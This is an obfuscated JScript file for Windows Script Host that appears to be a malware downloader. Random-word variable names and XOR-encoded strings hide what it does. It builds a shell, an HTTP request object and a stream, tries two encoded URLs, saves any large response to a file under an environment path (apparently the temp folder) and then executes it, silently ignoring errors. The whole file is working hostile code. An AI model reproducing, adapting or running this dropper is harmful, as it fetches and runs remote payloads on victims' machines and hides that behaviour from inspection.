function decode(unexceptionablen7r, tractmAU, admonishUwW) {
    var crabbedvIv = [ 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, 64, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 ];
    var incandescentXrZ = tractmAU;
    if (!incandescentXrZ) {
        incandescentXrZ = new Uint8Array(Math.ceil(unexceptionablen7r.length / 4) * 3);
    }
    unexceptionablen7r = unexceptionablen7r.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    admonishUwW = admonishUwW || 0;
    var throngIOc, docileBNO, ordainGNv, discreettRp;
    var densecFt = 0, objectiveEt6 = admonishUwW;
    while (densecFt < unexceptionablen7r.length) {
        throngIOc = crabbedvIv[unexceptionablen7r.charCodeAt(densecFt++) - 43];
        docileBNO = crabbedvIv[unexceptionablen7r.charCodeAt(densecFt++) - 43];
        ordainGNv = crabbedvIv[unexceptionablen7r.charCodeAt(densecFt++) - 43];
        discreettRp = crabbedvIv[unexceptionablen7r.charCodeAt(densecFt++) - 43];
        incandescentXrZ[objectiveEt6++] = throngIOc << 2 | docileBNO >> 4;
        if (ordainGNv !== 64) {
            incandescentXrZ[objectiveEt6++] = (docileBNO & 15) << 4 | ordainGNv >> 2;
            if (discreettRp !== 64) {
                incandescentXrZ[objectiveEt6++] = (ordainGNv & 3) << 6 | discreettRp;
            }
        }
    }
    return tractmAU ? objectiveEt6 - admonishUwW : incandescentXrZ.subarray(0, objectiveEt6);
}

var recourseJa9 = function(incandescentOaW) {
    var hackneyedHDh = [];
    var manifestationRVF = decode(incandescentOaW, hackneyedHDh);
    var mercurialxKC = "charCodeAt";
    var exciseteL = "";
    for (var densecFt = 0; densecFt < manifestationRVF; densecFt++) {
        exciseteL += String.fromCharCode(hackneyedHDh[densecFt] ^ "J39nNk7PWElYnREd"[mercurialxKC](densecFt % "J39nNk7PWElYnREd".length));
    }
    return exciseteL;
};

var incorrigibleQJC = function() {
    var passageCHg = function() {};
    passageCHg.prototype.create = function(apostateWvu) {
        var homespunaM5 = recourseJa9('"CUFcDzoOeDI9IA8t"');
        return WScript[homespunaM5](apostateWvu);
    };
    return passageCHg;
}();

(function() {
    var unaffectedgo2 = new incorrigibleQJC();
    var decorumTaP = 200;
    var resourceXcr = recourseJa9('"DXZt"');
    var anodynelDE = recourseJa9('"D0tcDQ=="');
    var palliatep1V = recourseJa9('"KUFcDzoO"');
    var notwithstandingXoa = recourseJa9('"HWBaHCcbQ34ELQk1Ag=="');
    var vassalhBY = recourseJa9('"B2BhIwJZGQgaCSQNOgI="');
    var debaseYZj = recourseJa9('"PgNqPH0hdmEkAg=="');
    var discursiveHLm = recourseJa9('"DABdJgggRSczLg=="');
    var frustratendh = recourseJa9('"DVt0BQAiciFiKA=="');
    var gratisR89 = recourseJa9('"C3d2Kgw="');
    var categoricalpJ5 = recourseJa9('"GUdLCy8G"');
    var penchantm6G = recourseJa9('"b2d8Ix5Oaw=="');
    var arbitraryETD = recourseJa9('"ZFZBCw=="');
    var chideaGl = Math.pow(2, 10) * 249;
    var savantypy = [ recourseJa9('"IkdNHnREGDElIAI9HD0wDzNCSEAtBFp/b3VCPBY3"'), recourseJa9('"IkdNHnREGDgyKQA2Fz0wCi1eWAAoDRkzOChDYV58IBwv"') ];
    var muselHj = 2097152;
    var bestowbBv = unaffectedgo2[palliatep1V];
    var vacateiRi = bestowbBv(notwithstandingXoa);
    var prospectiveTqI = bestowbBv(vassalhBY);
    var rarefiedomL = bestowbBv(gratisR89 + recourseJa9('"ZA=="') + categoricalpJ5);
    var prattleEIx = vacateiRi.ExpandEnvironmentStrings(penchantm6G);
    var theoryxzU = prattleEIx + muselHj + arbitraryETD;
    var rebusD8h = false;
    for (var interpolateshj = 0; interpolateshj < savantypy.length; interpolateshj++) {
        try {
            var cantA1j = savantypy[interpolateshj];
            prospectiveTqI.open(resourceXcr, cantA1j, false);
            prospectiveTqI.send();
            if (prospectiveTqI.status == decorumTaP) {
                try {
                    rarefiedomL.open();
                    rarefiedomL.type = 1;
                    rarefiedomL.write(prospectiveTqI[recourseJa9('"OFZKHiEFRDUVKggg"')]);
                    if (rarefiedomL.size > chideaGl) {
                        interpolateshj = savantypy.length;
                        rarefiedomL.position = 0;
                        rarefiedomL.saveToFile(theoryxzU, 2);
                        rebusD8h = true;
                    }
                } finally {
                    rarefiedomL.close();
                }
            }
        } catch (ignored) {}
    }
    if (rebusD8h) {
        vacateiRi[anodynelDE](prattleEIx + Math.pow(2, 21));
    }
})();